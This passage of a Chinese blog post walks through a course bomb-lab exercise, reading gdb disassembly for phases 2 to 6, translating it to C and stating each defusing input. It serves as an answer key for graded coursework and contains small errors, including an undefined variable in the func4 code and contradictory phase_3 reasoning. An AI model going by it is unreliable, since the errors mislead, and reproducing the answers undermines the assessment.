&lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ec5 &lt;+41&gt;:add    <span class="variable">$0x4</span>,%rbx</span><br><span class="line">   0x0000000000400ec9 &lt;+45&gt;:cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400ecc &lt;+48&gt;:jne    0x400eb7 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400ece &lt;+50&gt;:jmp    0x400edc &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400ed0 &lt;+52&gt;:lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400ed5 &lt;+57&gt;:lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400eda &lt;+62&gt;:jmp    0x400eb7 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400edc &lt;+64&gt;:add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x0000000000400ee0 &lt;+68&gt;:pop    %rbx</span><br><span class="line">   0x0000000000400ee1 &lt;+69&gt;:pop    %rbp</span><br><span class="line">   0x0000000000400ee2 &lt;+70&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>+3处发现在栈中开辟了0x28的内存区域.然后将%rsp的值传给%rsi作为<br>参数传给函数read_six_numbers,可以看出应该使用开辟的空闲内存做<br>数组,记数组为r,读取六个数字.将(%rsp)和0x1比较,如果不等,就会爆<br>炸,(％rsp)为数组首元,故r[0]＝１;跳转到+52,将r[1]地址赋给%rbx,<br>将r<a href="实际不存在">6</a>地址赋给%rbp,跳到+27,将%eax设为%rbx指向的前一个<br>数,此时为r[0],比较r[1]和2*r[0]是否相等,不等则爆炸.跳转到+41,％<br>rbx+4,比较%rbx和%rbp,不等跳转到+27,重复,等则跳转到+64结束,成功<br>.可以看出，这是一个循环比较.等价于下面的c语a言</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> *b = &amp;r[<span class="number">1</span>]; b != &amp;r[<span class="number">6</span>]; b++)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(*b != <span class="number">2</span> * (*(b - <span class="number">1</span>)))</span><br><span class="line">        call explode_bomb;</span><br></pre></td></tr></tbody></table></figure><p>故答案应该为1 2 4 8 16 32.</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400ef1 &lt;+14&gt;:mov    <span class="variable">$0x4027cd</span>,%esi</span><br><span class="line">0x0000000000400ef6 &lt;+19&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">0x0000000000400efb &lt;+24&gt;:callq  0x400ba0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x0000000000400f00 &lt;+29&gt;:cmp    <span class="variable">$0x1</span>,%eax</span><br></pre></td></tr></tbody></table></figure><p>查看0x4027cd,</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4027cd</span><br><span class="line">0x4027cd: <span class="string">"%d %d"</span></span><br></pre></td></tr></tbody></table></figure><p>可知,应该是读入了两个整数.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   0x0000000000400f15 &lt;+50&gt;:jmpq   *0x402500(,%rax,8)</span><br><span class="line">   0x0000000000400f1c &lt;+57&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f21 &lt;+62&gt;:jmp    0x400f28 &lt;phase_3+69&gt;</span><br><span class="line">   0x0000000000400f23 &lt;+64&gt;:mov    <span class="variable">$0x19c</span>,%eax</span><br><span class="line">   0x0000000000400f28 &lt;+69&gt;:sub    <span class="variable">$0xcd</span>,%eax</span><br><span class="line">   0x0000000000400f2d &lt;+74&gt;:jmp    0x400f34 &lt;phase_3+81&gt;</span><br><span class="line">   0x0000000000400f2f &lt;+76&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f34 &lt;+81&gt;:add    <span class="variable">$0x29b</span>,%eax</span><br><span class="line">   0x0000000000400f39 &lt;+86&gt;:jmp    0x400f40 &lt;phase_3+93&gt;</span><br><span class="line">   0x0000000000400f3b &lt;+88&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x0000000000400f40 &lt;+93&gt;:sub    <span class="variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f45 &lt;+98&gt;:jmp    0x400f4c &lt;phase_3+105&gt;</span><br><span class="line">   0x0000000000400f47 &lt;+100&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f4c &lt;+105&gt;:add    <span class="variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f51 &lt;+110&gt;:jmp    0x400f58 &lt;phase_3+117&gt;</span><br><span class="line">   0x0000000000400f53 &lt;+112&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f58 &lt;+117&gt;:sub    <span class="variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f5d &lt;+122&gt;:jmp    0x400f64 &lt;phase_3+129&gt;</span><br><span class="line">   0x0000000000400f5f &lt;+124&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f64 &lt;+129&gt;:add    <span class="variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f69 &lt;+134&gt;:jmp    0x400f70 &lt;phase_3+141&gt;</span><br><span class="line">   0x0000000000400f6b &lt;+136&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f70 &lt;+141&gt;:sub    <span class="variable">$0x36f</span>,%eax</span><br><span class="line">   0x0000000000400f75 &lt;+146&gt;:jmp    0x400f81 &lt;phase_3+158&gt;</span><br><span class="line">   0x0000000000400f77 &lt;+148&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f7c &lt;+153&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400f81 &lt;+158&gt;:cmpl   <span class="variable">$0x5</span>,0xc(%rsp)</span><br><span class="line">   0x0000000000400f86 &lt;+163&gt;:jg     0x400f8e &lt;phase_3+171&gt;</span><br><span class="line">   0x0000000000400f88 &lt;+165&gt;:cmp    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000400f8c &lt;+169&gt;:je     0x400f93 &lt;phase_3+176&gt;</span><br><span class="line">   0x0000000000400f8e &lt;+171&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br></pre></td></tr></tbody></table></figure><p>由这段汇编代码可知,这是一段switch语句,使用输入的第一个值作为key,<br>经过对应跳转位置的操作后应与第二个数相等.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x *（0x402500 + 32）</span><br><span class="line"><span class="variable">$1</span> = 0x400f47</span><br></pre></td></tr></tbody></table></figure><p>那么第一个数为0时,跳转到0x400f23处,那么第二个数应该为此处的0x0,<br>故一组答案为4 0;</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_4</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_4:</span><br><span class="line">   0x0000000000400fd0 &lt;+0&gt;:sub    <span class="variable">$0x18</span>,%rsp</span><br><span class="line">   0x0000000000400fd4 &lt;+4&gt;:lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000400fd9 &lt;+9&gt;:lea    0x8(%rsp),%rdx</span><br><span class="line">   0x0000000000400fde &lt;+14&gt;:mov    <span class="variable">$0x4027cd</span>,%esi</span><br><span class="line">   0x0000000000400fe3 &lt;+19&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400fe8 &lt;+24&gt;:callq  0x400ba0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400fed &lt;+29&gt;:cmp    <span class="variable">$0x2</span>,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+32&gt;:jne    0x400ffe &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+34&gt;:mov    0xc(%rsp),%eax</span><br><span class="line">   0x0000000000400ff6 &lt;+38&gt;:sub    <span class="variable">$0x2</span>,%eax</span><br><span class="line">   0x0000000000400ff9 &lt;+41&gt;:cmp    <span class="variable">$0x2</span>,%eax</span><br><span class="line">   0x0000000000400ffc &lt;+44&gt;:jbe    0x401003 &lt;phase_4+51&gt;</span><br><span class="line">   0x0000000000400ffe &lt;+46&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401003 &lt;+51&gt;:mov    0xc(%rsp),%esi</span><br><span class="line">   0x0000000000401007 &lt;+55&gt;:mov    <span class="variable">$0x9</span>,%edi</span><br><span class="line">   0x000000000040100c &lt;+60&gt;:callq  0x400f98 &lt;func4&gt;</span><br><span class="line">   0x0000000000401011 &lt;+65&gt;:cmp    0x8(%rsp),%eax</span><br><span class="line">   0x0000000000401015 &lt;+69&gt;:je     0x40101c &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401017 &lt;+71&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040101c &lt;+76&gt;:add    <span class="variable">$0x18</span>,%rsp</span><br><span class="line">   0x0000000000401020 &lt;+80&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>由代码易知,phase_4读入了两个数,第二个数在2-4之间,然后将第二个数作为<br>func4的第二个参数,func4第一个参数为9,输入的第一个数必须和func4返回值相等.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas func4 </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> func4:</span><br><span class="line">   0x0000000000400f98 &lt;+0&gt;:push   %r12</span><br><span class="line">   0x0000000000400f9a &lt;+2&gt;:push   %rbp</span><br><span class="line">   0x0000000000400f9b &lt;+3&gt;:push   %rbx</span><br><span class="line">   0x0000000000400f9c &lt;+4&gt;:mov    %edi,%ebx</span><br><span class="line">   0x0000000000400f9e &lt;+6&gt;:<span class="built_in">test</span>   %edi,%edi</span><br><span class="line">   0x0000000000400fa0 &lt;+8&gt;:jle    0x400fc6 &lt;func4+46&gt;</span><br><span class="line">   0x0000000000400fa2 &lt;+10&gt;:mov    %esi,%ebp</span><br><span class="line">   0x0000000000400fa4 &lt;+12&gt;:mov    %esi,%eax</span><br><span class="line">   0x0000000000400fa6 &lt;+14&gt;:cmp    <span class="variable">$0x1</span>,%edi</span><br><span class="line">   0x0000000000400fa9 &lt;+17&gt;:je     0x400fcb &lt;func4+51&gt;</span><br><span class="line">   0x0000000000400fab &lt;+19&gt;:lea    -0x1(%rdi),%edi</span><br><span class="line">   0x0000000000400fae &lt;+22&gt;:callq  0x400f98 &lt;func4&gt;</span><br><span class="line">   0x0000000000400fb3 &lt;+27&gt;:lea    (%rax,%rbp,1),%r12d</span><br><span class="line">   0x0000000000400fb7 &lt;+31&gt;:lea    -0x2(%rbx),%edi</span><br><span class="line">   0x0000000000400fba &lt;+34&gt;:mov    %ebp,%esi</span><br><span class="line">   0x0000000000400fbc &lt;+36&gt;:callq  0x400f98 &lt;func4&gt;</span><br><span class="line">   0x0000000000400fc1 &lt;+41&gt;:add    %r12d,%eax</span><br><span class="line">   0x0000000000400fc4 &lt;+44&gt;:jmp    0x400fcb &lt;func4+51&gt;</span><br><span class="line">   0x0000000000400fc6 &lt;+46&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000400fcb &lt;+51&gt;:pop    %rbx</span><br><span class="line">   0x0000000000400fcc &lt;+52&gt;:pop    %rbp</span><br><span class="line">   0x0000000000400fcd &lt;+53&gt;:pop    %r12</span><br><span class="line">   0x0000000000400fcf &lt;+55&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>此函数等价于下面的c代码</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(a &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    <span class="keyword">return</span> b + func4(a - <span class="number">1</span>, b) + func4(n - <span class="number">2</span>, b);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>穷举2-4的值即可得到答案,取答案为176 2</p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_5</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_5:</span><br><span class="line">   0x0000000000401021 &lt;+0&gt;:push   %rbx</span><br><span class="line">   0x0000000000401022 &lt;+1&gt;:mov    %rdi,%rbx</span><br><span class="line">   0x0000000000401025 &lt;+4&gt;:callq  0x401261 &lt;string_length&gt;</span><br><span class="line">   0x000000000040102a &lt;+9&gt;:cmp    <span class="variable">$0x6</span>,%eax</span><br><span class="line">   0x000000000040102d &lt;+12&gt;:je     0x401034 &lt;phase_5+19&gt;</span><br><span class="line">   0x000000000040102f &lt;+14&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401034 &lt;+19&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000401039 &lt;+24&gt;:mov    <span class="variable">$0x0</span>,%edx</span><br><span class="line">   0x000000000040103e &lt;+29&gt;:movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x0000000000401042 &lt;+33&gt;:and    <span class="variable">$0xf</span>,%ecx</span><br><span class="line">   0x0000000000401045 &lt;+36&gt;:add    0x402540(,%rcx,4),%edx</span><br><span class="line">   0x000000000040104c &lt;+43&gt;:add    <span class="variable">$0x1</span>,%rax</span><br><span class="line">   0x0000000000401050 &lt;+47&gt;:cmp    <span class="variable">$0x6</span>,%rax</span><br><span class="line">   0x0000000000401054 &lt;+51&gt;:jne    0x40103e &lt;phase_5+29&gt;</span><br><span class="line">   0x0000000000401056 &lt;+53&gt;:cmp    <span class="variable">$0x27</span>,%edx</span><br><span class="line">   0x0000000000401059 &lt;+56&gt;:je     0x401060 &lt;phase_5+63&gt;</span><br><span class="line">   0x000000000040105b &lt;+58&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401060 &lt;+63&gt;:pop    %rbx</span><br><span class="line">   0x0000000000401061 &lt;+64&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>由汇编代码可知,需要输入一个长度为6的字符串.令该字符串为input,+36处出现的<br>数组为array,则该汇编等价于下面代码.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    sum += <span class="built_in">array</span>[ input[i] &amp; <span class="number">0xf</span> ];</span><br></pre></td></tr></tbody></table></figure><p>意为遍历输入字符串,取该字符串低4位作为array下标,取出array值相加.<br>查看array的值  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x *0x402540@16</span><br><span class="line"><span class="variable">$2</span> = {0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, </span><br><span class="line">  0xf, 0xd}</span><br></pre></td></tr></tbody></table></figure><p>题目要求sum = 0x27,故从array中选出6个和为0x27的数,通过这6个数的下标找出对应字符.<br>答案应为01347L;</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>因为课程未对后续两关作要求,故不做特别详细的解答.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_6</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_6:</span><br><span class="line">   0x0000000000401062 &lt;+0&gt;:push   %r13</span><br><span class="line">   0x0000000000401064 &lt;+2&gt;:push   %r12</span><br><span class="line">   0x0000000000401066 &lt;+4&gt;:push   %rbp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:push   %rbx</span><br><span class="line">   0x0000000000401068 &lt;+6&gt;:sub    <span class="variable">$0x58</span>,%rsp</span><br><span class="line">   0x000000000040106c &lt;+10&gt;:lea    0x30(%rsp),%rsi</span><br><span class="line">   0x0000000000401071 &lt;+15&gt;:callq  0x40151a &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000401076 &lt;+20&gt;:lea    0x30(%rsp),%r13</span><br><span class="line">   0x000000000040107b &lt;+25&gt;:mov    <span class="variable">$0x0</span>,%r12d</span><br><span class="line">   0x0000000000401081 &lt;+31&gt;:mov    %r13,%rbp</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:mov    0x0(%r13),%eax</span><br><span class="line">   0x0000000000401088 &lt;+38&gt;:sub    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:cmp    <span class="variable">$0x5</span>,%eax</span><br><span class="line">   0x000000000040108e &lt;+44&gt;:jbe    0x401095 &lt;phase_6+51&gt;</span><br><span class="line">   0x0000000000401090 &lt;+46&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401095 &lt;+51&gt;:add    <span class="variable">$0x1</span>,%r12d</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:cmp    <span class="variable">$0x6</span>,%r12d</span><br><span class="line">   0x000000000040109d &lt;+59&gt;:jne    0x4010a6 &lt;phase_6+68&gt;</span><br><span class="line">   0x000000000040109f &lt;+61&gt;:mov    <span class="variable">$0x0</span>,%esi</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:jmp    0x4010e8 &lt;phase_6+134&gt;</span><br><span class="line">   0x00000000004010a6 &lt;+68&gt;:mov    %r12d,%ebx</span><br><span class="line">   0x00000000004010a9 &lt;+71&gt;:movslq %ebx,%rax</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:mov    0x30(%rsp,%rax,4),%eax</span><br><span class="line">   0x00000000004010b0 &lt;+78&gt;:cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:jne    0x4010ba &lt;phase_6+88&gt;</span><br><span class="line">   0x00000000004010b5 &lt;+83&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010ba &lt;+88&gt;:add    <span class="variable">$0x1</span>,%ebx</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:cmp    <span class="variable">$0x5</span>,%ebx</span><br><span class="line">   0x00000000004010c0 &lt;+94&gt;:jle    0x4010a9 &lt;phase_6+71&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:add    <span class="variable">$0x4</span>,%r13</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:jmp    0x401081 &lt;phase_6+31&gt;</span><br><span class="line">   0x00000000004010c8 &lt;+102&gt;:mov    0x8(%rdx),%rdx</span><br><span class="line">   0x00000000004010cc &lt;+106&gt;:add    <span class="variable">$0x1</span>,%eax</span><br><span class="line">   0x00000000004010cf &lt;+109&gt;:cmp    %ecx,%eax</span><br><span class="line">   0x00000000004010d1 &lt;+111&gt;:jne    0x4010c8 &lt;phase_6+102&gt;</span><br><span class="line">   0x00000000004010d3 &lt;+113&gt;:jmp    0x4010da &lt;phase_6+120&gt;</span><br><span class="line">   0x00000000004010d5 &lt;+115&gt;:mov    <span class="variable">$0x603410</span>,%edx</span><br><span class="line">   0x00000000004010da &lt;+120&gt;:mov    %rdx,(%rsp,%rsi,2)</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:add    <span class="variable">$0x4</span>,%rsi</span><br><span class="line">   0x00000000004010e2 &lt;+128&gt;:cmp    <span class="variable">$0x18</span>,%rsi</span><br><span class="line">   0x00000000004010e6 &lt;+132&gt;:je     0x4010fd &lt;phase_6+155&gt;</span><br><span class="line">   0x00000000004010e8 &lt;+134&gt;:mov    0x30(%rsp,%rsi,1),%ecx</span><br><span class="line">   0x00000000004010ec &lt;+138&gt;:cmp    <span class="variable">$0x1</span>,%ecx</span><br><span class="line">   0x00000000004010ef &lt;+141&gt;:jle    0x4010d5 &lt;phase_6+115&gt;</span><br><span class="line">   0x00000000004010f1 &lt;+143&gt;:mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x00000000004010f6 &lt;+148&gt;:mov    <span class="variable">$0x603410</span>,%edx</span><br><span class="line">   0x00000000004010fb &lt;+153&gt;:jmp    0x4010c8 &lt;phase_6+102&gt;</span><br><span class="line">   0x00000000004010fd &lt;+155&gt;:mov    (%rsp),%rbx</span><br><span class="line">   0x0000000000401101 &lt;+159&gt;:lea    0x8(%rsp),%rax</span><br><span class="line">   0x0000000000401106 &lt;+164&gt;:lea    0x30(%rsp),%rsi</span><br><span class="line">   0x000000000040110b &lt;+169&gt;:mov    %rbx,%rcx</span><br><span class="line">   0x000000000040110e &lt;+172&gt;:mov    (%rax),%rdx</span><br><span class="line">   0x0000000000401111 &lt;+175&gt;:mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x0000000000401115 &lt;+179&gt;:add    <span class="variable">$0x8</span>,%rax</span><br><span class="line">   0x0000000000401119 &lt;+183&gt;:cmp    %rsi,%rax</span><br><span class="line">   0x000000000040111c &lt;+186&gt;:je     0x401123 &lt;phase_6+193&gt;</span><br><span class="line">   0x000000000040111e &lt;+188&gt;:mov    %rdx,%rcx</span><br><span class="line">   0x0000000000401121 &lt;+191&gt;:jmp    0x40110e &lt;phase_6+172&gt;</span><br><span class="line">   0x0000000000401123 &lt;+193&gt;:movq   <span class="variable">$0x0</span>,0x8(%rdx)</span><br><span class="line">   0x000000000040112b &lt;+201&gt;:mov    <span class="variable">$0x5</span>,%ebp</span><br><span class="line">   0x0000000000401130 &lt;+206&gt;:mov    0x8(%rbx),%rax</span><br><span class="line">   0x0000000000401134 &lt;+210&gt;:mov    (%rax),%eax</span><br><span class="line">   0x0000000000401136 &lt;+212&gt;:cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000401138 &lt;+214&gt;:jge    0x40113f &lt;phase_6+221&gt;</span><br><span class="line">   0x000000000040113a &lt;+216&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040113f &lt;+221&gt;:mov    0x8(%rbx),%rbx</span><br><span class="line">   0x0000000000401143 &lt;+225&gt;:sub    <span class="variable">$0x1</span>,%ebp</span><br><span class="line">   0x0000000000401146 &lt;+228&gt;:jne    0x401130 &lt;phase_6+206&gt;</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x0000000000401148 &lt;+230&gt;:add    <span class="variable">$0x58</span>,%rsp</span><br><span class="line">   0x000000000040114c &lt;+234&gt;:pop    %rbx</span><br><span class="line">   0x000000000040114d &lt;+235&gt;:pop    %rbp</span><br><span class="line">   0x000000000040114e &lt;+236&gt;:pop    %r12</span><br><span class="line">   0x0000000000401150 &lt;+238&gt;:pop    %r13</span><br><span class="line">   0x0000000000401152 &lt;+240&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>汇编代码很长.其意为输入6个互不相等的数,介于1-6.按这6个数的值从位于地址0x603410的链表中选出对应位置的<br>节点指针,组成一个数组.按选出的顺序将这六个节点组成新的链表,然后检查这个链表是否为降序.<br>查看链表的值.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 